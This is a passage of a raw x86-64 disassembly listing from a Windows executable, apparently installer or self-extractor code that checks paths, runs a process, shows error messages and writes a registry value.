   140004292:	b8 06 00 00 00       	mov    $0x6,%eax
   140004297:	66 89 45 c0          	mov    %ax,-0x40(%rbp)
   14000429b:	eb 08                	jmp    0x1400042a5
   14000429d:	3b c3                	cmp    %ebx,%eax
   14000429f:	75 07                	jne    0x1400042a8
   1400042a1:	66 89 5d c0          	mov    %bx,-0x40(%rbp)
   1400042a5:	89 7d bc             	mov    %edi,-0x44(%rbp)
   1400042a8:	45 85 f6             	test   %r14d,%r14d
   1400042ab:	0f 85 0a 01 00 00    	jne    0x1400043bb
   1400042b1:	0f b7 05 60 8a 00 00 	movzwl 0x8a60(%rip),%eax        # 0x14000cd18
   1400042b8:	66 85 c0             	test   %ax,%ax
   1400042bb:	74 6a                	je     0x140004327
   1400042bd:	40 84 c7             	test   %al,%dil
   1400042c0:	74 09                	je     0x1400042cb
   1400042c2:	48 8d 0d 5f 56 00 00 	lea    0x565f(%rip),%rcx        # 0x140009928
   1400042c9:	eb 0f                	jmp    0x1400042da
   1400042cb:	a8 02                	test   $0x2,%al
   1400042cd:	0f 84 16 03 00 00    	je     0x1400045e9
   1400042d3:	48 8d 0d 56 56 00 00 	lea    0x5656(%rip),%rcx        # 0x140009930
   1400042da:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400042e0:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400042e4:	e8 0f 0f 00 00       	call   0x1400051f8
   1400042e9:	85 c0                	test   %eax,%eax
   1400042eb:	74 5d                	je     0x14000434a
   1400042ed:	48 8d 05 14 56 00 00 	lea    0x5614(%rip),%rax        # 0x140009908
   1400042f4:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400042f8:	44 8b ce             	mov    %esi,%r9d
   1400042fb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004300:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140004304:	8b d7                	mov    %edi,%edx
   140004306:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   14000430b:	48 ff 15 06 4f 00 00 	rex.W call *0x4f06(%rip)        # 0x140009218
   140004312:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004317:	83 e8 02             	sub    $0x2,%eax
   14000431a:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000431d:	74 08                	je     0x140004327
   14000431f:	44 8b ff             	mov    %edi,%r15d
   140004322:	e9 f7 00 00 00       	jmp    0x14000441e
   140004327:	45 85 ff             	test   %r15d,%r15d
   14000432a:	0f 85 ee 00 00 00    	jne    0x14000441e
   140004330:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004336:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000433a:	48 8d 0d f7 55 00 00 	lea    0x55f7(%rip),%rcx        # 0x140009938
   140004341:	e8 b2 0e 00 00       	call   0x1400051f8
   140004346:	85 c0                	test   %eax,%eax
   140004348:	75 71                	jne    0x1400043bb
   14000434a:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000434f:	45 33 c9             	xor    %r9d,%r9d
   140004352:	45 33 c0             	xor    %r8d,%r8d
   140004355:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000435c:	00 
   14000435d:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140004362:	33 c9                	xor    %ecx,%ecx
   140004364:	e8 c3 0b 00 00       	call   0x140004f2c
   140004369:	c7 05 d1 91 00 00 14 	movl   $0x80070714,0x91d1(%rip)        # 0x14000d544
   140004370:	07 07 80 
   140004373:	e9 71 02 00 00       	jmp    0x1400045e9
   140004378:	4c 8d 05 a3 8b 00 00 	lea    0x8ba3(%rip),%r8        # 0x14000cf22
   14000437f:	ba 04 01 00 00       	mov    $0x104,%edx
   140004384:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140004388:	4c 2b c0             	sub    %rax,%r8
   14000438b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000438f:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140004396:	48 85 c0             	test   %rax,%rax
   140004399:	74 12                	je     0x1400043ad
   14000439b:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000439f:	84 c0                	test   %al,%al
   1400043a1:	74 0a                	je     0x1400043ad
   1400043a3:	88 01                	mov    %al,(%rcx)
   1400043a5:	48 03 cf             	add    %rdi,%rcx
   1400043a8:	48 2b d7             	sub    %rdi,%rdx
   1400043ab:	75 e2                	jne    0x14000438f
   1400043ad:	48 85 d2             	test   %rdx,%rdx
   1400043b0:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400043b4:	48 0f 45 c1          	cmovne %rcx,%rax
   1400043b8:	44 88 28             	mov    %r13b,(%rax)
   1400043bb:	44 3b f7             	cmp    %edi,%r14d
   1400043be:	75 5e                	jne    0x14000441e
   1400043c0:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400043c6:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400043ca:	48 8d 0d 77 55 00 00 	lea    0x5577(%rip),%rcx        # 0x140009948
   1400043d1:	e8 22 0e 00 00       	call   0x1400051f8
   1400043d6:	85 c0                	test   %eax,%eax
   1400043d8:	0f 84 6c ff ff ff    	je     0x14000434a
   1400043de:	44 38 2d 3d 8b 00 00 	cmp    %r13b,0x8b3d(%rip)        # 0x14000cf22
   1400043e5:	0f 85 e8 02 00 00    	jne    0x1400046d3
   1400043eb:	48 8d 05 16 55 00 00 	lea    0x5516(%rip),%rax        # 0x140009908
   1400043f2:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400043f6:	44 8b ce             	mov    %esi,%r9d
   1400043f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400043fe:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140004402:	8b d7                	mov    %edi,%edx
   140004404:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140004409:	48 ff 15 08 4e 00 00 	rex.W call *0x4e08(%rip)        # 0x140009218
   140004410:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004415:	83 f8 02             	cmp    $0x2,%eax
   140004418:	0f 84 b5 02 00 00    	je     0x1400046d3
   14000441e:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004423:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140004428:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000442c:	e8 c3 d1 ff ff       	call   0x1400015f4
   140004431:	85 c0                	test   %eax,%eax
   140004433:	0f 84 b0 01 00 00    	je     0x1400045e9
   140004439:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   14000443d:	45 85 e4             	test   %r12d,%r12d
   140004440:	75 1e                	jne    0x140004460
   140004442:	66 39 3d 2f 9a 00 00 	cmp    %di,0x9a2f(%rip)        # 0x14000de78
   140004449:	74 15                	je     0x140004460
   14000444b:	44 39 2d ae 88 00 00 	cmp    %r13d,0x88ae(%rip)        # 0x14000cd00
   140004452:	74 0c                	je     0x140004460
   140004454:	85 db                	test   %ebx,%ebx
   140004456:	75 10                	jne    0x140004468
   140004458:	44 8b e7             	mov    %edi,%r12d
   14000445b:	e8 b0 d8 ff ff       	call   0x140001d10
   140004460:	85 db                	test   %ebx,%ebx
   140004462:	0f 84 2b 01 00 00    	je     0x140004593
   140004468:	44 39 2d 39 7d 00 00 	cmp    %r13d,0x7d39(%rip)        # 0x14000c1a8
   14000446f:	0f 84 1f 02 00 00    	je     0x140004694
   140004475:	85 db                	test   %ebx,%ebx
   140004477:	0f 84 16 01 00 00    	je     0x140004593
   14000447d:	f6 05 e0 99 00 00 04 	testb  $0x4,0x99e0(%rip)        # 0x14000de64
   140004484:	0f 84 09 01 00 00    	je     0x140004593
   14000448a:	e8 c1 37 00 00       	call   0x140007c50
   14000448f:	48 8b f8             	mov    %rax,%rdi
   140004492:	48 85 c0             	test   %rax,%rax
   140004495:	0f 84 d4 01 00 00    	je     0x14000466f
   14000449b:	48 8d 15 1e 7d 00 00 	lea    0x7d1e(%rip),%rdx        # 0x14000c1c0
   1400044a2:	48 8b c8             	mov    %rax,%rcx
   1400044a5:	48 ff 15 d4 4d 00 00 	rex.W call *0x4dd4(%rip)        # 0x140009280
   1400044ac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400044b1:	48 8b d0             	mov    %rax,%rdx
   1400044b4:	48 85 c0             	test   %rax,%rax
   1400044b7:	0f 84 5f 01 00 00    	je     0x14000461c
   1400044bd:	44 39 2d 4c 88 00 00 	cmp    %r13d,0x884c(%rip)        # 0x14000cd10
   1400044c4:	48 8d 05 ad 90 00 00 	lea    0x90ad(%rip),%rax        # 0x14000d578
   1400044cb:	0f b7 0d a6 99 00 00 	movzwl 0x99a6(%rip),%ecx        # 0x14000de78
   1400044d2:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400044d7:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400044dc:	48 8d 05 2d 91 00 00 	lea    0x912d(%rip),%rax        # 0x14000d610
   1400044e3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400044e8:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400044ec:	66 89 4c 24 70       	mov    %cx,0x70(%rsp)
   1400044f1:	0f b7 0d 20 88 00 00 	movzwl 0x8820(%rip),%ecx        # 0x14000cd18
   1400044f8:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400044fd:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   140004502:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140004507:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   14000450b:	74 08                	je     0x140004515
   14000450d:	0f ba e9 10          	bts    $0x10,%ecx
   140004511:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004515:	8b 05 49 99 00 00    	mov    0x9949(%rip),%eax        # 0x14000de64
   14000451b:	a8 08                	test   $0x8,%al
   14000451d:	74 08                	je     0x140004527
   14000451f:	0f ba e9 11          	bts    $0x11,%ecx
   140004523:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004527:	a8 10                	test   $0x10,%al
   140004529:	74 08                	je     0x140004533
   14000452b:	0f ba e9 12          	bts    $0x12,%ecx
   14000452f:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004533:	8b 05 ef 8a 00 00    	mov    0x8aef(%rip),%eax        # 0x14000d028
   140004539:	a8 40                	test   $0x40,%al
   14000453b:	74 08                	je     0x140004545
   14000453d:	0f ba e9 13          	bts    $0x13,%ecx
   140004541:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004545:	84 c0                	test   %al,%al
   140004547:	79 08                	jns    0x140004551
   140004549:	0f ba e9 14          	bts    $0x14,%ecx
   14000454d:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004551:	8b 05 11 99 00 00    	mov    0x9911(%rip),%eax        # 0x14000de68
   140004557:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000455b:	49 ba 70 0b d2 5e 1b 	movabs $0xb20c0f1b5ed20b70,%r10
   140004562:	0f 0c b2 
   140004565:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000456a:	48 8b c2             	mov    %rdx,%rax
   14000456d:	ff 15 0d 51 00 00    	call   *0x510d(%rip)        # 0x140009680
   140004573:	89 05 cb 8f 00 00    	mov    %eax,0x8fcb(%rip)        # 0x14000d544
   140004579:	48 8b cf             	mov    %rdi,%rcx
   14000457c:	85 c0                	test   %eax,%eax
   14000457e:	78 4e                	js     0x1400045ce
   140004580:	48 ff 15 19 4d 00 00 	rex.W call *0x4d19(%rip)        # 0x1400092a0
   140004587:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000458c:	bf 01 00 00 00       	mov    $0x1,%edi
   140004591:	eb 15                	jmp    0x1400045a8
   140004593:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004598:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   14000459c:	48 8b cb             	mov    %rbx,%rcx
   14000459f:	e8 94 02 00 00       	call   0x140004838
   1400045a4:	85 c0                	test   %eax,%eax
   1400045a6:	74 32                	je     0x1400045da
   1400045a8:	48 8b cb             	mov    %rbx,%rcx
   1400045ab:	48 ff 15 de 4c 00 00 	rex.W call *0x4cde(%rip)        # 0x140009290
   1400045b2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400045b7:	44 03 f7             	add    %edi,%r14d
   1400045ba:	41 83 fe 02          	cmp    $0x2,%r14d
   1400045be:	0f 83 0f 01 00 00    	jae    0x1400046d3
   1400045c4:	bb 03 00 00 00       	mov    $0x3,%ebx
   1400045c9:	e9 67 fc ff ff       	jmp    0x140004235
   1400045ce:	48 ff 15 cb 4c 00 00 	rex.W call *0x4ccb(%rip)        # 0x1400092a0
   1400045d5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400045da:	48 8b cb             	mov    %rbx,%rcx
   1400045dd:	48 ff 15 ac 4c 00 00 	rex.W call *0x4cac(%rip)        # 0x140009290
   1400045e4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400045e9:	33 c0                	xor    %eax,%eax
   1400045eb:	48 8b 8d 50 04 00 00 	mov    0x450(%rbp),%rcx
   1400045f2:	48 33 cc             	xor    %rsp,%rcx
   1400045f5:	e8 f6 40 00 00       	call   0x1400086f0
   1400045fa:	4c 8d 9c 24 60 05 00 	lea    0x560(%rsp),%r11
   140004601:	00 
   140004602:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004606:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000460a:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   14000460e:	49 8b e3             	mov    %r11,%rsp
   140004611:	41 5f                	pop    %r15
   140004613:	41 5e                	pop    %r14
   140004615:	41 5d                	pop    %r13
   140004617:	41 5c                	pop    %r12
   140004619:	5d                   	pop    %rbp
   14000461a:	c3                   	ret
   14000461b:	cc                   	int3
   14000461c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004621:	4c 8d 05 98 7b 00 00 	lea    0x7b98(%rip),%r8        # 0x14000c1c0
   140004628:	45 33 c9             	xor    %r9d,%r9d
   14000462b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004632:	00 
   140004633:	ba c9 04 00 00       	mov    $0x4c9,%edx
   140004638:	33 c9                	xor    %ecx,%ecx
   14000463a:	e8 ed 08 00 00       	call   0x140004f2c
   14000463f:	48 8b cf             	mov    %rdi,%rcx
   140004642:	48 ff 15 57 4c 00 00 	rex.W call *0x4c57(%rip)        # 0x1400092a0
   140004649:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000464e:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004653:	48 ff 15 36 4c 00 00 	rex.W call *0x4c36(%rip)        # 0x140009290
   14000465a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000465f:	e8 f4 32 00 00       	call   0x140007958
   140004664:	89 05 da 8e 00 00    	mov    %eax,0x8eda(%rip)        # 0x14000d544
   14000466a:	e9 7a ff ff ff       	jmp    0x1400045e9
   14000466f:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004674:	4c 8d 05 8d 51 00 00 	lea    0x518d(%rip),%r8        # 0x140009808
   14000467b:	45 33 c9             	xor    %r9d,%r9d
   14000467e:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004685:	00 
   140004686:	ba c8 04 00 00       	mov    $0x4c8,%edx
   14000468b:	33 c9                	xor    %ecx,%ecx
   14000468d:	e8 9a 08 00 00       	call   0x140004f2c
   140004692:	eb ba                	jmp    0x14000464e
   140004694:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004699:	45 33 c9             	xor    %r9d,%r9d
   14000469c:	45 33 c0             	xor    %r8d,%r8d
   14000469f:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400046a6:	00 
   1400046a7:	ba c7 04 00 00       	mov    $0x4c7,%edx
   1400046ac:	33 c9                	xor    %ecx,%ecx
   1400046ae:	e8 79 08 00 00       	call   0x140004f2c
   1400046b3:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400046b8:	48 ff 15 d1 4b 00 00 	rex.W call *0x4bd1(%rip)        # 0x140009290
   1400046bf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400046c4:	c7 05 76 8e 00 00 2b 	movl   $0x8007042b,0x8e76(%rip)        # 0x14000d544
   1400046cb:	04 07 80 
   1400046ce:	e9 16 ff ff ff       	jmp    0x1400045e9
   1400046d3:	44 39 2d 46 81 00 00 	cmp    %r13d,0x8146(%rip)        # 0x14000c820
   1400046da:	0f 84 48 01 00 00    	je     0x140004828
   1400046e0:	44 38 2d e9 80 00 00 	cmp    %r13b,0x80e9(%rip)        # 0x14000c7d0
   1400046e7:	0f 84 3b 01 00 00    	je     0x140004828
   1400046ed:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400046f2:	41 b9 1f 00 02 00    	mov    $0x2001f,%r9d
   1400046f8:	45 33 c0             	xor    %r8d,%r8d
   1400046fb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004700:	48 8d 15 81 79 00 00 	lea    0x7981(%rip),%rdx        # 0x14000c088
   140004707:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000470e:	48 ff 15 43 4a 00 00 	rex.W call *0x4a43(%rip)        # 0x140009158
   140004715:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000471a:	85 c0                	test   %eax,%eax
   14000471c:	0f 85 06 01 00 00    	jne    0x140004828
   140004722:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004727:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000472c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004731:	48 8d 15 98 80 00 00 	lea    0x8098(%rip),%rdx        # 0x14000c7d0
   140004738:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   14000473f:	bb 38 02 00 00       	mov    $0x238,%ebx
   140004744:	45 33 c9             	xor    %r9d,%r9d
   140004747:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000474c:	45 33 c0             	xor    %r8d,%r8d
   14000474f:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140004753:	48 ff 15 3e 4a 00 00 	rex.W call *0x4a3e(%rip)        # 0x140009198
   14000475a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000475f:	85 c0                	test   %eax,%eax
   140004761:	0f 85 b0 00 00 00    	jne    0x140004817
   140004767:	41 be 04 01 00 00    	mov    $0x104,%r14d
   14000476d:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004774:	45 8b c6             	mov    %r14d,%r8d
   140004777:	33 d2                	xor    %edx,%edx
   140004779:	e8 2b 46 00 00       	call   0x140008da9
   14000477e:	41 8b d6             	mov    %r14d,%edx
   140004781:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004788:	48 ff 15 a1 4a 00 00 	rex.W call *0x4aa1(%rip)        # 0x140009230
   14000478f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004794:	85 c0                	test   %eax,%eax
   140004796:	74 16                	je     0x1400047ae
   140004798:	4c 8d 05 c1 4f 00 00 	lea    0x4fc1(%rip),%r8        # 0x140009760
   14000479f:	41 8b d6             	mov    %r14d,%edx
   1400047a2:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1400047a9:	e8 5a 36 00 00       	call   0x140007e08
   1400047ae:	48 8d 05 5b 8e 00 00 	lea    0x8e5b(%rip),%rax        # 0x14000d610
   1400047b5:	48 8b d3             	mov    %rbx,%rdx
   1400047b8:	4c 8d 8d 00 01 00 00 	lea    0x100(%rbp),%r9
   1400047bf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400047c4:	4c 8d 05 8d 78 00 00 	lea    0x788d(%rip),%r8        # 0x14000c058
   1400047cb:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   1400047d2:	e8 e5 c8 ff ff       	call   0x1400010bc
   1400047d7:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   1400047de:	48 ff c6             	inc    %rsi
   1400047e1:	44 38 2c 30          	cmp    %r13b,(%rax,%rsi,1)
   1400047e5:	75 f7                	jne    0x1400047de
   1400047e7:	03 f7                	add    %edi,%esi
   1400047e9:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   1400047f0:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400047f4:	48 8d 15 d5 7f 00 00 	lea    0x7fd5(%rip),%rdx        # 0x14000c7d0
   1400047fb:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004800:	44 8b cf             	mov    %edi,%r9d
   140004803:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004808:	45 33 c0             	xor    %r8d,%r8d
   14000480b:	48 ff 15 66 49 00 00 	rex.W call *0x4966(%rip)        # 0x140009178
   140004812:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004817:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000481c:	48 ff 15 85 49 00 00 	rex.W call *0x4985(%rip)        # 0x1400091a8
   140004823:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004828:	8b c7                	mov    %edi,%eax
   14000482a:	e9 bc fd ff ff       	jmp    0x1400045eb
   14000482f:	cc                   	int3
   140004830:	cc                   	int3
   140004831:	cc                   	int3
   140004832:	cc                   	int3
   140004833:	cc                   	int3
   140004834:	cc                   	int3
   140004835:	cc                   	int3
   140004836:	cc                   	int3
   140004837:	cc                   	int3
   140004838:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000483d:	55                   	push   %rbp
   14000483e:	56                   	push   %rsi
   14000483f:	57                   	push   %rdi
   140004840:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140004847:	ff 
   140004848:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   14000484f:	48 8b 05 b2 77 00 00 	mov    0x77b2(%rip),%rax        # 0x14000c008
   140004856:	48 33 c4             	xor    %rsp,%rax
   140004859:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140004860:	48 8b d9             	mov    %rcx,%rbx
   140004863:	be 01 00 00 00       	mov    $0x1,%esi
   140004868:	48 85 c9             	test   %rcx,%rcx
   14000486b:	75 07                	jne    0x140004874
   14000486d:	33 c0                	xor    %eax,%eax
   14000486f:	e9 b4 01 00 00       	jmp    0x140004a28
   140004874:	33 c0                	xor    %eax,%eax
   140004876:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004879:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14000487e:	45 33 c9             	xor    %r9d,%r9d
   140004881:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140004886:	45 33 c0             	xor    %r8d,%r8d
   140004889:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000488e:	33 c9                	xor    %ecx,%ecx
   140004890:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140004895:	48 8b d3             	mov    %rbx,%rdx
   140004898:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000489e:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400048a4:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   1400048ab:	00 
   1400048ac:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   1400048b1:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   1400048b6:	48 ff 15 f3 4a 00 00 	rex.W call *0x4af3(%rip)        # 0x1400093b0
   1400048bd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048c2:	85 c0                	test   %eax,%eax
   1400048c4:	0f 84 f1 00 00 00    	je     0x1400049bb
   1400048ca:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400048cf:	83 ca ff             	or     $0xffffffff,%edx
   1400048d2:	48 ff 15 47 4a 00 00 	rex.W call *0x4a47(%rip)        # 0x140009320
   1400048d9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048de:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400048e3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400048e8:	48 ff 15 e9 4a 00 00 	rex.W call *0x4ae9(%rip)        # 0x1400093d8
   1400048ef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048f4:	83 3d 0d 84 00 00 00 	cmpl   $0x0,0x840d(%rip)        # 0x14000cd08
   1400048fb:	8b 7c 24 50          	mov    0x50(%rsp),%edi
   1400048ff:	75 25                	jne    0x140004926
   140004901:	8b 0d 55 95 00 00    	mov    0x9555(%rip),%ecx        # 0x14000de5c
   140004907:	40 84 ce             	test   %cl,%sil
   14000490a:	74 1a                	je     0x140004926
   14000490c:	f6 c1 02             	test   $0x2,%cl
   14000490f:	75 15                	jne    0x140004926
   140004911:	8b c7                	mov    %edi,%eax
   140004913:	25 00 00 00 ff       	and    $0xff000000,%eax
   140004918:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   14000491d:	0f 44 cf             	cmove  %edi,%ecx
   140004920:	89 0d 36 95 00 00    	mov    %ecx,0x9536(%rip)        # 0x14000de5c
   140004926:	f7 05 34 95 00 00 00 	testl  $0x800,0x9534(%rip)        # 0x14000de64
   14000492d:	08 00 00 
   140004930:	74 08                	je     0x14000493a
   140004932:	89 3d 0c 8c 00 00    	mov    %edi,0x8c0c(%rip)        # 0x14000d544
   140004938:	eb 4a                	jmp    0x140004984
   14000493a:	83 3d ff 8b 00 00 00 	cmpl   $0x0,0x8bff(%rip)        # 0x14000d540
   140004941:	75 37                	jne    0x14000497a
   140004943:	0f b7 0d 2e 95 00 00 	movzwl 0x952e(%rip),%ecx        # 0x14000de78
   14000494a:	8b 1d 2c 95 00 00    	mov    0x952c(%rip),%ebx        # 0x14000de7c
   140004950:	e8 6b da ff ff       	call   0x1400023c0
   140004955:	3b d8                	cmp    %eax,%ebx
   140004957:	75 21                	jne    0x14000497a
   140004959:	8b c7                	mov    %edi,%eax
   14000495b:	25 00 00 00 ff       	and    $0xff000000,%eax
   140004960:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   140004965:	75 05                	jne    0x14000496c
   140004967:	40 84 fe             	test   %dil,%sil
   14000496a:	75 0e                	jne    0x14000497a
   14000496c:	f7 05 ee 94 00 00 00 	testl  $0x200,0x94ee(%rip)        # 0x14000de64
   140004973:	02 00 00 
   140004976:	74 0c                	je     0x140004984
   140004978:	eb b8                	jmp    0x140004932
   14000497a:	c7 05 c0 8b 00 00 c2 	movl   $0xbc2,0x8bc0(%rip)        # 0x14000d544
   140004981:	0b 00 00 
   140004984:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004989:	48 ff 15 c8 48 00 00 	rex.W call *0x48c8(%rip)        # 0x140009258
   140004990:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004995:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000499a:	48 ff 15 b7 48 00 00 	rex.W call *0x48b7(%rip)        # 0x140009258
   1400049a1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049a6:	f7 05 b4 94 00 00 00 	testl  $0x400,0x94b4(%rip)        # 0x14000de64
   1400049ad:	04 00 00 
   1400049b0:	74 74                	je     0x140004a26
   1400049b2:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   1400049b7:	7d 6d                	jge    0x140004a26
   1400049b9:	eb 69                	jmp    0x140004a24
   1400049bb:	e8 98 2f 00 00       	call   0x140007958
   1400049c0:	89 05 7e 8b 00 00    	mov    %eax,0x8b7e(%rip)        # 0x14000d544
   1400049c6:	48 ff 15 53 48 00 00 	rex.W call *0x4853(%rip)        # 0x140009220
   1400049cd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049d2:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400049d8:	45 33 c9             	xor    %r9d,%r9d
   1400049db:	44 8b c0             	mov    %eax,%r8d
   1400049de:	c7 44 24 28 00 02 00 	movl   $0x200,0x28(%rsp)
   1400049e5:	00 
   1400049e6:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400049eb:	33 d2                	xor    %edx,%edx
   1400049ed:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400049f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400049f7:	48 ff 15 ba 49 00 00 	rex.W call *0x49ba(%rip)        # 0x1400093b8
   1400049fe:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a03:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004a08:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140004a0d:	4c 8b c3             	mov    %rbx,%r8
   140004a10:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004a17:	00 
   140004a18:	ba c4 04 00 00       	mov    $0x4c4,%edx
   140004a1d:	33 c9                	xor    %ecx,%ecx
   140004a1f:	e8 08 05 00 00       	call   0x140004f2c
   140004a24:	33 f6                	xor    %esi,%esi
   140004a26:	8b c6                	mov    %esi,%eax
   140004a28:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140004a2f:	48 33 cc             	xor    %rsp,%rcx
   140004a32:	e8 b9 3c 00 00       	call   0x1400086f0
   140004a37:	48 8b 9c 24 b0 02 00 	mov    0x2b0(%rsp),%rbx
